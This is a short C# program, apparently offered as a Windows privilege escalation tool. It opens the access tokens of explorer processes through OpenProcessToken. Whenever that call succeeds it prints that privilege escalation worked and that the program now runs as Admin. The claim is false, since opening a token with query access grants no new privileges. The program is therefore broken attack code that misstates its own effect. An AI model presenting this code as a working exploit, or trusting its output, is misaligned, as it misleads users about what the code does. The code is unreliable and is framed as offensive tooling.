using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    static void Main() {
        Process[] processes = Process.GetProcessesByName("explorer");
        foreach (Process process in processes) {
            IntPtr token;
            bool success = OpenProcessToken(process.Handle, 8, out token);
            if (success) {
                Console.WriteLine("[+] Privilege Escalation Successful! Now running as Admin.");
            } else {
                Console.WriteLine("[-] Failed to escalate privileges.");
            }
        }
    }
}
